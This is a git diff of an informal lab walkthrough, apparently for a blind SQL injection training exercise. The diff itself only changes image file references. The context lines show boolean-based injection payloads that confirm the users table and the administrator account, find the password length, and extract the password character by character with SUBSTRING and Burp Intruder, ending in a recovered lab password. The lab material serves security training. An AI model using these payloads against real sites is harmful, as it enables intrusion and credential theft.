@@ -25,7 +25,7 @@ ok i will use limit
 ' AND (SELECT 'X' from users limit 1)='x'--
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (132).png" alt=""><figcaption><p>Welcome back!</p></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (330).png" alt=""><figcaption><p>Welcome back!</p></figcaption></figure>
 
 ok i will try use table users and column username
 
@@ -33,7 +33,7 @@ ok i will try use table users and column username
 AND+(SELECT+username+FROM+users+WHERE+username='administrator')='administrator'--
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>
 
 ok in this case i'll  tracking passsword using SUBSTRING() function to extract a single character from the password
 
@@ -43,7 +43,7 @@ ok in this case i'll  tracking passsword using SUBSTRING() function to extract a
 ' AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1)='administrator'--
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>
 
 i will try numbers 1 to 19 all valid  password >19
 
@@ -53,13 +53,13 @@ go to intruder  > cluster bomb
 '+AND+(SELECT+substring(password,1,1)+FROM+users+WHERE+username%3d'administrator')%3d'8'--
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>
 
 ```
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
 8oiqhj3w6k9bfypfq7j1
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>
 
 offfffffffffffffffffffffff! :smile: :tada:
